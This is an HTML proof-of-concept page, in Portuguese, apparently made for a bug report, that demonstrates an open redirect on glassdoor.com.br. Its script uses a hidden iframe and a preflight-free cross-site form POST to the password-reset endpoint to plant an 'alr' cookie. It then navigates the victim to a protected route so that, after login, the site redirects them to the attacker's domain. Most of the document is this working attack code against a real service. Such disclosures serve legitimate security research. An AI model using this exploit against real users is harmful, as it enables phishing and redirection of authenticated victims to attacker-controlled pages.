<!doctype html>
<meta charset="utf-8">
<title>Glassdoor Redirect PoC – alr consumer</title>
<body>
<h2>PoC – Open Redirect via cookie <code>alr</code> (forçando rota protegida)</h2>
<pre id="log" style="background:#111;color:#eee;padding:10px;white-space:pre-wrap"></pre>

<script>
(function () {
  const log = (m)=>{document.getElementById('log').textContent += m + "\n"};

  // 1) cria iframe “sink” e form text/plain (sem preflight) para setar alr=referer
  const iframe = document.createElement('iframe');
  iframe.name = 'sink';
  iframe.style.display = 'none';
  document.body.appendChild(iframe);

  const form = document.createElement('form');
  form.action = 'https://www.glassdoor.com.br/auth/account/password/forgot/initiate';
  form.method = 'POST';
  form.enctype = 'text/plain';
  form.target = 'sink';

  const ta = document.createElement('textarea');
  ta.name = '';
  ta.value = JSON.stringify({ emailAddress: "victim@example.com" });
  form.appendChild(ta);
  document.body.appendChild(form);

  log("[1/3] Enviando POST para setar cookie alr com o Referer desta página…");
  try { form.submit(); } catch(e){ log("Falha ao enviar form: " + e.message); }

  // 2) pequeno delay para Set-Cookie chegar
  setTimeout(function(){
    log("[2/3] Verifique em Application → Cookies → https://www.glassdoor.com.br se 'alr' aponta para este domínio.");
    // 3) agora força navegação para rota PROTEGIDA que pede login
    const protectedPath = "/member/profile"; // tente /member/account/settings se preferir
    log("[3/3] Navegando para rota protegida: " + protectedPath);
    window.location.href = "https://www.glassdoor.com.br" + protectedPath;
  }, 1200);
})();
</script>

<p style="font-size:12px;color:#666;margin-top:16px">
Fluxo esperado: esta página seta <code>alr</code> → você é levado a <code>/member/profile</code> (que exige login) → após autenticar, o site consome o <code>alr</code> e redireciona você de volta para este domínio (GitHub Pages).
</p>
</body>
